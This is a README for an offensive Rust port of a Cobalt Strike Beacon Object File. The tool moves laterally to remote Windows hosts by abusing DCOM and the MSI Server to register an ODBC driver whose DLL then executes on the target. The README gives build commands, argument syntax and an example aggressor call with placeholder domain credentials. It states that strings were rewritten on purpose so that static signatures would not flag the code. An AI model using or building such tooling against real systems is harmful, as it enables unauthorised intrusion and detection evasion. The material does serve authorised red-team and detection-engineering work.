# LetMoveMSI

Rust port of [werdhaihai/msi_lateral_mv](https://github.com/werdhaihai/msi_lateral_mv). Two crates in one workspace:

- `bof/`: no_std Beacon Object File for Cobalt Strike. Authenticates to the MSI Server over DCOM, spawns a Custom Action Server, and calls `SQLInstallDriverEx` + `SQLConfigDriver` to install an ODBC driver whose Setup DLL executes on the target.
- `driver/`: Rust cdylib (`odbcpivot.dll`) exporting `ConfigDriver`. A minimal payload that logs the caller's token context to a file.

The technique is described in the SpecterOps write-up [DCOM Again: Installing Trouble Lateral Movement BOF](https://specterops.io/blog/2025/09/29/dcom-again-installing-trouble-lateral-movement-bof/) by Werd Haihai. The Custom Action Server bounce is Eliran Nasser's (Deep Instinct).

String literals, log paths, and internal module names were rewritten so nothing byte-matches the upstream C source. Static signatures over the public repo would otherwise flag this port immediately.

## Requirements

- Rust nightly (pinned via `rust-toolchain.toml`)
- [boflink](https://github.com/MEhrn00/boflink) on `PATH`
- [cargo-make](https://github.com/sagiegurari/cargo-make)
- For the driver DLL: `rustup target add x86_64-pc-windows-gnu` and a working MinGW linker

## Build

```
# BoF: produces letmove_msi.x64.o and letmove_msi.x86.o under bof/out/
cd bof && cargo make

# Driver: cross-compile from Linux/macOS
cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
```

Artifacts:

- `bof/out/letmove_msi.x64.o`, `bof/out/letmove_msi.x86.o`
- `target/x86_64-pc-windows-gnu/release/odbcpivot.dll`

## BoF usage

Arguments are seven wide (UTF-16LE) strings in fixed positional order. Pass an empty string for absent fields.

```
letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>
```

- `mode`: `local` or `remote`.
- `host`: target machine name. Required for `remote`, empty for `local`.
- `domain` / `user` / `pass`: alternate credentials. Leave all three empty to run as the caller.
- `driver`: ODBC driver name to register (arbitrary).
- `dll`: absolute path to the driver DLL on the **target**, not the operator's machine. Stage `odbcpivot.dll` (or any DLL exporting `ConfigDriver`) there first.

Example Cobalt Strike aggressor call:

```
bof_execute($1, "letmove_msi.x64.o", "ZZZZZZZ",
    "remote", "DC01", "CORP", "svc-admin", "P4ss!",
    "LMPivot", "C:\\Windows\\Temp\\odbcpivot.dll");
```

## Driver behaviour

`ConfigDriver` collects the invoking process's token context (SID, elevation, logon session id, PID, integrity level) and appends one line per field to a log file. The default path is `%PROGRAMDATA%\odbcpivot.dat`. Override at compile time with the `ODBCPIVOT_LOG` environment variable:

```
ODBCPIVOT_LOG='C:\\Temp\\out.dat' cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
```

Swap the DLL for your own if you need a different payload.

## Layout

```
bof/
  src/argv.rs      wire-protocol argument parsing
  src/vtbl.rs      IUnknown, IMsiServer, IMsiCustomAction vtables + GUIDs
  src/secure.rs    COAUTHIDENTITY / COAUTHINFO builder + proxy blanket
  src/stage.rs     MsiServer authentication + CustomActionServer bring-up
  src/deploy.rs    SQLInstallDriverEx + SQLConfigDriver invocation
  Makefile.toml    boflink recipe
driver/
  src/lib.rs       DllMain + ConfigDriver
Cargo.toml         workspace root
rust-toolchain.toml
```

## Credits

- Original C BoF and technique: [werdhaihai/msi_lateral_mv](https://github.com/werdhaihai/msi_lateral_mv)
- SpecterOps write-up: [DCOM Again](https://specterops.io/blog/2025/09/29/dcom-again-installing-trouble-lateral-movement-bof/)
- Custom Action Server bounce: Eliran Nasser (Deep Instinct), [Forget PsExec: DCOM Upload & Execute Backdoor](https://www.deepinstinct.com/blog/forget-psexec-dcom-upload-execute-backdoor)
- BoF template: [joaoviictorti/rustbof](https://github.com/joaoviictorti/rustbof)

## License

MIT. See `LICENSE`.

## Disclaimer

For authorized security testing, red-team engagements, and detection-engineering research. You are responsible for having permission to run this against every target you touch.
